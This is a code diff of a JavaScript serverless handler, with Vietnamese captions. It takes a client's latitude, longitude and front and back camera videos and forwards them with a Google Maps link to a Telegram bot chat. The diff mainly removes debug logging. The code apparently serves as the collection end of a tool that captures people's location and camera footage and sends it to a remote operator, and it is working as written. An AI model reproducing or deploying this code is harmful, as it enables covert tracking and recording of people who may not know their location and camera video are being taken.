@@ -30,10 +30,6 @@ export default async function handler(req) {
     if (contentType.includes("multipart/form-data")) {
       formData = await req.formData();
       clientData = JSON.parse(formData.get("clientInfo") || "{}");
-      console.log('📥 FormData nhận được:');
-      console.log('- clientInfo:', clientData);
-      console.log('- hasFront:', formData.has("front"));
-      console.log('- hasBack:', formData.has("back"));
     } else {
       clientData = await req.json();
     }
@@ -54,70 +50,53 @@ export default async function handler(req) {
 📍 Vĩ độ: ${lat}
 📍 Kinh độ: ${lon}
 🗺️ Google Maps: https://www.google.com/maps/place/${lat},${lon}
-🎥 Video trước: ${hasFront ? '✅ Có' : '❌ Không'}
-🎥 Video sau: ${hasBack ? '✅ Có' : '❌ Không'}
+🎥 Video: ${clientData.camera || "✅ Đã quay thành công"}
 
 ⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.
 `.trim();
 
-    console.log('📤 Bắt đầu gửi lên Telegram...');
-
     if (hasFront || hasBack) {
-      let frontResult = null;
-      let backResult = null;
-
+      // Gửi video trước
       if (hasFront) {
         const frontFile = formData.get("front");
-        console.log(`📤 Gửi front.mp4, dung lượng: ${(frontFile.size / 1024).toFixed(2)} KB`);
         const frontForm = new FormData();
         frontForm.append("chat_id", CHAT_ID);
         frontForm.append("video", frontFile);
         frontForm.append("caption", finalCaption);
         frontForm.append("supports_streaming", "true");
 
-        frontResult = await fetch(
+        await fetch(
           `https://api.telegram.org/bot${TOKEN}/sendVideo`,
           {
             method: "POST",
             body: frontForm,
           }
         );
-        console.log('✅ Đã gửi front.mp4');
       }
 
+      // Gửi video sau
       if (hasBack) {
         const backFile = formData.get("back");
-        console.log(`📤 Gửi back.mp4, dung lượng: ${(backFile.size / 1024).toFixed(2)} KB`);
         const backForm = new FormData();
         backForm.append("chat_id", CHAT_ID);
         backForm.append("video", backFile);
-        if (!hasFront) {
-          backForm.append("caption", finalCaption);
-        }
         backForm.append("supports_streaming", "true");
 
-        backResult = await fetch(
+        await fetch(
           `https://api.telegram.org/bot${TOKEN}/sendVideo`,
           {
             method: "POST",
             body: backForm,
           }
         );
-        console.log('✅ Đã gửi back.mp4');
       }
 
-      const response = {
-        front: frontResult ? await frontResult.text() : null,
-        back: backResult ? await backResult.text() : null
-      };
-      
-      return new Response(JSON.stringify(response), { 
+      return new Response(JSON.stringify({ success: true }), { 
         status: 200,
         headers: { 'Content-Type': 'application/json' }
       });
       
     } else {
-      console.log('📤 Không có video, gửi text...');
       const res = await fetch(
         `https://api.telegram.org/bot${TOKEN}/sendMessage`,
         {
@@ -132,7 +111,6 @@ export default async function handler(req) {
       return new Response(await res.text(), { status: 200 });
     }
   } catch (err) {
-    console.error('❌ Lỗi:', err);
     return new Response(JSON.stringify({ error: err.message }), {
       status: 500,
     });
